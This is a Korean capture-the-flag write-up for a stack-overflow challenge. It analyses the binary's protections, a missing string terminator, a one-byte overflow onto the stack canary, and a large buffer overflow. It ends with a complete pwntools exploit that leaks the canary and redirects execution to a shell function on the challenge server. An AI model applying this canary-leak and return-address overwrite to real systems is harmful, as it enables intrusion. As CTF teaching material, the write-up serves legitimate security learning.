# struct person_t

## 문제 설명

I created a program with my own structure, struct person_t! 🧑‍🦱

## 풀이

### 분석

먼저 `checksec`으로 바이너리의 보호 기법을 확인했다.

```bash
$ checksec --file=./chall
RELRO           STACK CANARY      NX            PIE
Partial RELRO   Canary found      NX enabled    No PIE
```

Stack Canary와 NX가 적용되어 있었다. 따라서 단순히 스택에 셸코드를 넣고 반환 주소를 덮는 방식은 어렵다. 대신 프로그램 안에 이미 셸을 실행해 주는 함수가 있었다.

```c
void get_shell() {
    execve("/bin/sh", 0, 0);
}
```

바이너리는 strip되어 있어서 `elf.sym["get_shell"]`로 심볼을 찾을 수 없었다. `objdump`로 확인한 `get_shell()`의 주소는 `0x401216`이었다. PIE가 꺼져 있으므로 실행할 때마다 이 코드 주소는 바뀌지 않는다.

`person_t` 구조체와 실제 스택의 배치는 다음과 같았다.

| 구조체 시작 기준 오프셋 | 내용 | 크기 |
|---:|---|---:|
| 0 | `nationality` | 32바이트 |
| 32 | `name` | 56바이트 |
| 88 | `height` | 8바이트 |
| 96 | `age` | 4바이트 |
| 100 | `male_or_female` | 4바이트 |
| 104 | Stack Canary | 8바이트 |
| 112 | Saved RBP | 8바이트 |
| 120 | Return address | 8바이트 |

구조체의 시작 주소는 `rbp-0x70`이고, Canary는 `rbp-0x8`에 있다. 따라서 구조체 시작부터 Canary까지의 거리는 104바이트이다.

### 취약점

첫 번째 문제는 `read_input()`이 항상 문자열의 끝에 NULL 문자를 넣어 주지 않는다는 점이다.

```c
void read_input(char *ptr, size_t len) {
    ssize_t readn;

    readn = read(0, ptr, len);

    if (ptr[readn - 1] == '\n') {
        ptr[readn - 1] = '\0';
    }
}
```

입력의 마지막 문자가 개행일 때만 `\0`으로 바뀐다. 따라서 이름에 개행 없이 정확히 56바이트를 보내면 `name` 뒤에 문자열 종료 문자가 없다.

```c
read_input(person.name, 56);
printf("Hi %s.\n", person.name);
```

이 상태에서 `%s`로 이름을 출력하면 `name` 뒤에 있는 `height`, `age`, `male_or_female`까지 계속 출력한다. 하지만 Canary의 첫 바이트는 원래 `0x00`이므로 평소에는 Canary 앞에서 출력이 멈춘다.

두 번째 문제는 성별 입력에서 발생하는 1바이트 오버플로이다.

```c
char male_or_female[4];

read_input(person.male_or_female, 5);
```

배열의 크기는 4바이트인데 5바이트를 입력받는다. 이 배열 바로 뒤에는 Stack Canary가 있으므로 다섯 번째 바이트가 Canary의 첫 바이트를 덮는다.

```text
male_or_female         Stack Canary
42 42 42 42      |     42 xx xx xx xx xx xx xx
```

원래 `0x00`이었던 Canary의 첫 바이트를 `B`, 즉 `0x42`로 바꾸면 이름을 출력할 때 Canary의 나머지 7바이트도 함께 출력된다.

세 번째 문제는 국적 입력에서 발생하는 큰 스택 버퍼 오버플로이다.

```c
char nationality[32];

read_input(person.nationality, 128);
```

32바이트 배열에 최대 128바이트를 입력할 수 있다. `nationality`부터 반환 주소까지의 크기가 정확히 128바이트이므로 Canary, Saved RBP, 반환 주소를 모두 덮을 수 있다.

```text
104바이트: nationality부터 Canary 직전까지
  8바이트: Stack Canary
  8바이트: Saved RBP
  8바이트: Return address
---------------------------------------
128바이트
```

### 익스플로잇

먼저 이름에 `A`를 56개 보내 문자열 종료 문자를 없앴다.

```python
payload1 = b'A' * 56
p.sendafter(b'Enter name: ', payload1)
```

이름부터 Canary까지 출력이 중간에 끊기지 않게 하려면 `height`와 `age`에도 NULL 바이트가 없어야 한다. 나이로 사용한 `1094795585`는 16진수로 `0x41414141`이다.

```python
p.sendlineafter(b'Enter age: ', b'1094795585')
```

키에는 메모리의 `double` 표현에 NULL 바이트가 없는 `1.23456789`를 사용했다. 뒤에 `B`를 6개 붙였다.

```python
payload2 = b'1.23456789'
payload2 += b'B' * 6
p.sendafter(b'Enter height: ', payload2)
```

처음에는 성별 배열이 4바이트이고 5바이트를 읽으므로 `B`를 5개만 보내면 된다고 생각했다. 하지만 이 프로그램은 `scanf()`와 `read()`를 섞어 사용한다. 테스트한 glibc 환경에서는 `scanf("%lf")`가 숫자 뒤의 첫 번째 `B`를 미리 읽어 내부 버퍼에 보관했다. 그다음 직접 호출된 `read()`가 남은 `B` 5개를 받도록 총 6개를 보내야 Canary 첫 바이트까지 덮을 수 있었다.

출력에서 이름 56바이트, 키 8바이트, 나이 4바이트, 성별 4바이트를 지나면 오프셋 72부터 변조된 Canary가 나온다.

유출된 Canary의 첫 바이트 `0x42`는 내가 덮은 값이다. 실제 Canary의 첫 바이트는 `0x00`이므로 나머지 7바이트 앞에 NULL을 붙여 원래 값을 복구했다.

```python
canary = u64(b'\x00' + leak[73:80])
```

마지막 페이로드는 Canary 앞까지 104바이트를 채우고, 복구한 Canary와 Saved RBP용 8바이트를 넣은 뒤 반환 주소를 `get_shell()`로 변경한다.

```text
payload3
├── A × 104
├── 복구한 Canary 8바이트
├── B × 8 (Saved RBP)
└── 0x401216 (get_shell)
```

전체 익스플로잇 코드는 다음과 같다.

```python
from pwn import *

p = remote("host3.dreamhack.games", 19954)

get_shell = 0x401216

payload1 = b'A' * 56
p.sendafter(b'Enter name: ', payload1)

p.sendlineafter(b'Enter age: ', b'1094795585')

payload2 = b'1.23456789'
payload2 += b'B' * 6
p.sendafter(b'Enter height: ', payload2)

p.recvuntil(b'Hi ')
leak = p.recvuntil(
    b".\nWhat's your nationality? ",
    drop=True
)

canary = u64(b'\x00' + leak[73:80])
log.info('canary: ' + hex(canary))

payload3 = b'A' * 104
payload3 += p64(canary)
payload3 += b'B' * 8
payload3 += p64(get_shell)

p.send(payload3)
p.interactive()
```

## 배운 점

`scanf()`와 `read()`처럼 서로 다른 입력 방식을 섞으면 예상하지 못한 버퍼링이 생길 수 있어서, 실제 프로그램을 실행하면서 입력이 어떻게 소비되는지 확인하는 과정이 중요했다.
